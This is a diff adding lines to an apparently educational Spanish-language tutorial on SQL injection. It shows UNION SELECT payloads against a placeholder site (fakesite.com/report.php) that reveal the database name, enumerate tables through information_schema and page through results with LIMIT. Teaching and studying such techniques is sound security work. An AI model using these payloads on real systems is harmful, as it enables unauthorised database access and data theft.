@@ -151,3 +151,11 @@ Encontrado las tablas, continuamos:
 Suponiendo que se visualiza el número 3, podemos empezar a sustituir para filtrar contenido de la base de datos.
 
 `http://fakesite.com/report.php?id=-23 union select 1,2,database(),4,5;-- -` # imprime el nombre de la base de datos.
+
+Ahora podemos empezar a enumerar las tablas
+
+`http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database();-- -` # enumeramos tablas
+
+*podemos jugar con limit para imprimir todo el contenido por lineas*
+
+`http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 0,1;-- -`
